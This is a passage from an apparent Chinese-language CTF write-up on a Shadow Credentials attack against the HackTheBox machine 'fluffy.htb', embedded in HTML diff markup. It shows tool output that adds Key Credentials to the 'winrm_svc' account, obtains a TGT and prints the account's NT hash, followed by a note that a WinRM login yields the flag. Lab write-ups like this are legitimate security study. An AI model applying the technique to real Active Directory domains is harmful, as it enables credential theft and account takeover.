&#x27;a2f5eeba-1cbb-ad26-7946-af83048de07a&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;<br>[*] Authenticating as &#x27;winrm_svc&#x27; with the certificate<br>[*] Certificate identities:<br>[*]     No identities found in this certificate<br>[*] Using principal: &#x27;winrm_svc@fluffy.htb&#x27;<br>[*] Trying to get TGT...<br>[*] Got TGT<br>[*] Saving credential cache to &#x27;winrm_svc.ccache&#x27;<br>File &#x27;winrm_svc.ccache&#x27; already exists. Overwrite? (y/n - saying no will save with a unique filename): <br>[*] Wrote credential cache to &#x27;winrm_svc_697a5cc7-1ed5-402c-88e5-bf52cd99e7db.ccache&#x27;<br>[*] Trying to retrieve NT hash for &#x27;winrm_svc&#x27;<br>[*] Restoring the old Key Credentials for &#x27;winrm_svc&#x27;<br>[*] Successfully restored the old Key Credentials for &#x27;winrm_svc&#x27;<br>[*] NT hash for &#x27;winrm_svc&#x27;: 33bd09dcd697600edf6b3a7af4875767<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Shadow-Credentials-%E5%88%9D%E6%8E%A2/image-20250604180015608.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>winrm</code> 登录即可获取flag。后面的root不再进行，因为是下一个知识点。🤭</p>
+
                 
               </div>
             
